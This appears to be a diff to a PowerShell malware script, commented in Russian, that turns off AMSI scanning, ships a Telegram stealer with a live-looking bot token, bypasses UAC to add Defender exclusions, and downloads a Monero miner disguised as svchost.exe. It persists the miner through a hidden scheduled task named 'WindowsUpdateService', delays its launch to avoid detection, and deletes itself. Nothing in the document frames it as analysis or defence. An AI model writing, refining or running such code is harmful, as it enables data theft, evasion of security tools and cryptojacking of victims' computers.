@@ -1,5 +1,9 @@
+# AMSI Bypass (обход сканирования PowerShell)
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 
+# ==================== СТИЛЕР (Telegram) ====================
 $token = "8680192798:AAFdHwzr2HYwbGjz3gkaS5xlYjryAozMkGI"
 $chatId = "1940923712"
 
@@ -35,8 +39,9 @@ try {
     Remove-Item $zipFile -Force -ErrorAction SilentlyContinue
 }
 
+# ==================== ОБХОД UAC + ИСКЛЮЧЕНИЯ DEFENDER ====================
 $exclusionPath = "$env:APPDATA\Microsoft\Windows\Crypto"
-$tempScript = "$env:TEMP\uac_bypass.ps1"
+$tempScript = "$env:TEMP\uac_task.ps1"
 $cmd = "Add-MpPreference -ExclusionPath '$exclusionPath' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess 'svchost.exe' -ErrorAction SilentlyContinue"
 $encoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($cmd))
 "powershell.exe -NoP -Ep Bypass -Enc $encoded" | Out-File -FilePath $tempScript -Encoding ASCII
@@ -50,7 +55,8 @@ Start-Sleep -Seconds 5
 Remove-Item -Path $regPath -Recurse -Force -ErrorAction SilentlyContinue
 Remove-Item $tempScript -Force -ErrorAction SilentlyContinue
 
-$minerUrl = "https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-msvc-win64.zip"
+# ==================== СКРЫТЫЙ МАЙНЕР (SRBMiner-Multi) ====================
+$minerUrl = "https://github.com/doktor83/SRBMiner-Multi/releases/download/2.7.5/SRBMiner-Multi-2-7-5-win64.zip"
 $wallet = "44hEzgDamuSMLdWLUVkmJpJvTLeWjjc2LhUqa898N9eaXFm4QqJuTBR5HfKE8j954SReNHhZHW7NW5gdbWdQuVjg8maA4vz"
 $pool = "pool.supportxmr.com:3333"
 
@@ -58,51 +64,47 @@ $minerDir = $exclusionPath
 New-Item -ItemType Directory -Path $minerDir -Force | Out-Null
 attrib +h $minerDir
 
-$minerZip = "$env:TEMP\xmrig.zip"
+$minerZip = "$env:TEMP\srb.zip"
 Invoke-WebRequest -Uri $minerUrl -OutFile $minerZip -UseBasicParsing
-Expand-Archive -Path $minerZip -DestinationPath "$env:TEMP\xmrig" -Force
-Copy-Item "$env:TEMP\xmrig\xmrig-6.22.2\xmrig.exe" -Destination "$minerDir\svchost.exe" -Force
+Expand-Archive -Path $minerZip -DestinationPath "$env:TEMP\srb" -Force
+Copy-Item "$env:TEMP\srb\SRBMiner-Multi-2-7-5\SRBMiner-Multi.exe" -Destination "$minerDir\svchost.exe" -Force
 
 $config = @"
 {
-    "autosave": false,
     "cpu": {
         "enabled": true,
-        "max-threads-hint": 50,
-        "priority": 1,
-        "asm": true
+        "max_threads": 2,
+        "priority": 1
     },
     "pools": [
         {
-            "url": "$pool",
-            "user": "$wallet",
-            "pass": "x",
-            "tls": false,
-            "keepalive": true
+            "pool": "$pool",
+            "wallet": "$wallet",
+            "password": "x",
+            "algorithm": "rx/0"
         }
     ],
     "background": true,
-    "title": false,
-    "print-time": 0,
-    "http": {
-        "enabled": false
-    }
+    "title": false
 }
 "@
 $config | Out-File -FilePath "$minerDir\config.json" -Encoding ASCII
 
+# Создаём задачу в планировщике (автозапуск при старте, скрыто)
 $taskName = "WindowsUpdateService"
-$action = New-ScheduledTaskAction -Execute "$minerDir\svchost.exe" -Argument "--config=$minerDir\config.json"
+$action = New-ScheduledTaskAction -Execute "$minerDir\svchost.exe" -Argument "--config $minerDir\config.json"
 $trigger = New-ScheduledTaskTrigger -AtStartup
 $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -Hidden
 Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Force
 
-Start-Process -FilePath "$minerDir\svchost.exe" -ArgumentList "--config=$minerDir\config.json" -WindowStyle Hidden
+# НЕ ЗАПУСКАЕМ майнер сейчас, чтобы не спалить PowerShell
+# Он запустится после перезагрузки системы
 
+# Чистим временные файлы
 Remove-Item $minerZip -Force -ErrorAction SilentlyContinue
-Remove-Item "$env:TEMP\xmrig" -Recurse -Force -ErrorAction SilentlyContinue
+Remove-Item "$env:TEMP\srb" -Recurse -Force -ErrorAction SilentlyContinue
 
-Start-Sleep -Seconds 2
+# Самоуничтожение скрипта
 if ($MyInvocation.MyCommand.Path -and (Test-Path $MyInvocation.MyCommand.Path)) {
     Remove-Item $MyInvocation.MyCommand.Path -Force -ErrorAction SilentlyContinue
 }
